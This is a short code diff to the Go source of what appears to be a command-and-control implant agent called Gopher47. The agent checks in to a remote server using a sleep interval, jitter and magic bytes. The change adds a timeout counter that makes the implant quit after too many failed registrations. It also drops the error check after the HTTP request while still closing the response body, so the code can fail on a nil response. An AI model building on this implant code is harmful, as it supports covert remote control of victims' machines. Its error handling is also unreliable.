@@ -26,6 +26,8 @@ var url = c.Url
 var sleepTime = c.SleepTime
 var jitterRange = c.JitterRange
 var magicBytes = []byte("\x63\x61\x66\x65")
+var timeoutThreshold = c.TimeoutThreshold
+var timeoutCounter = -1
 // agentId set in main() because random seeding
 var agentId = ""
 
@@ -129,7 +131,11 @@ func checkIn(dat string, checkInType string) string{
 
 	client := &http.Client{}
     res, err := client.Do(req)
-    checkError(err)
+    if os.IsTimeout(err){
+		timeoutCounter += 1
+	} else {
+		timeoutCounter = 0
+	}
     defer res.Body.Close()
 
 	resBody, _ := ioutil.ReadAll(res.Body)
@@ -172,7 +178,12 @@ func main(){
 	for registered == "failed"{
 		registered = registerAgent(url, magicBytes, agentId)
 		time.Sleep((time.Duration(5) * time.Second))
+		timeoutCounter += 1
+		if timeoutCounter > timeoutThreshold {
+			os.Exit(0)
+		}
 	}
+	timeoutCounter = 0
 	//fmt.Println("[+] Gopher47 has checked in!")
 
 	command := ""
